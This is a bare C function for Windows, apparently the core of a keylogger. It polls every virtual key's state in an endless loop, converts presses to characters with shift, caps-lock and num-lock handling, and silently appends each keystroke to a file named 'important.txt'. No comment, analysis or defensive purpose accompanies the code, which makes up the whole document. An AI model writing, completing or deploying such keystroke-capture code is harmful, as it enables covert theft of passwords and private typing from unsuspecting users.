DWORD WINAPI logg() {
    int vkey, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isLSHIFT, isRSHIFT;
    int isPressed; 
    char showkey;
    char NUMCHAR[]=")!@#%^&*(";
    char chars_vn[]=";=,-./`";
    char chars_vs[]=":+,<_>?~";
    char chars_va[]="[\\]\';";
    char chars_vb[]="{|}\"";

    FILE *kh;

    char KEY_LOG_FILE[] = "important.txt";
    for(vkey=0; vkey<0xFF;vkey++){
        last_key_state[vkey] = 0;
    }

    while(1) {
        Sleep(10);

        isCAPSLOCK = (GetKeyState(0x14)&0xFF)>0?1:0;
        isNUMLOCK = (GetKeyState(0x90)&0xFF)>0?1:0;
        isLSHIFT = (GetKeyState(0xA0)&0xFF)>0?1:0;
        isRSHIFT = (GetKeyState(0xA1)&0xFF)>0?1:0;

        for(vkey=0; vkey<0xFF;vkey++){
            isPressed = (GetKeyState(vkey)&0xFF00)>0?1:0;
            showkey = (char)vkey;
            if(isPressed == 1 && last_key_state[vkey] == 0) {
                if(vkey>=0x41 && vkey<=0x5A){
                    if(isCAPSLOCK==0){
                        if(isLSHIFT==0 && isRSHIFT==0){
                            showkey = (char)(vkey+0x20);
                        }
                    }
                    else if (isLSHIFT == 1 || isRSHIFT == 1){
                        showkey = (char)(vkey+0x20);
                    }
                }

                else if (vkey>=0x30 && vkey<=0x39) {
                    if(isLSHIFT == 1 || isRSHIFT == 1) {
                        showkey = NUMCHAR[vkey-0x30];
                    }
                }

                else if (vkey>=0x60 && vkey<=0x69 && isNUMLOCK == 1) {
                    showkey = (char)(vkey-0x30);
                }

                else if (vkey >= 0xBA && vkey <=0xC0) {
                    if(isLSHIFT == 1 || isRSHIFT == 1) {
                        showkey = chars_vs[vkey-0xBA];
                    }

                    else {
                        showkey = chars_vn[vkey-0xBA];
                    }
                }

                else if (vkey >= 0xDB && vkey <= 0xDF) {
                    if(isLSHIFT == 1 || isRSHIFT == 1) {
                        showkey = chars_vb[vkey-0xDB];
                    }
                    else {
                        showkey = chars_va[vkey-0xDB];
                    }
                }


                else if (vkey == 0x0D) {
                    showkey = (char)0x0A;
                }

                else if (vkey >= 0x6A && vkey <= 0x6F) {
                    showkey = (char)(vkey-0x40);
                }

                else if (vkey != 0x20 && vkey != 0x09) {
                    showkey = (char)0x00;
                }

                if (showkey != (char) 0x00) {
                    kh = fopen(KEY_LOG_FILE, "a");
                    putc(showkey, kh);
                    fclose(kh);
                }
            }

            last_key_state[vkey] = isPressed;
        }
    }
}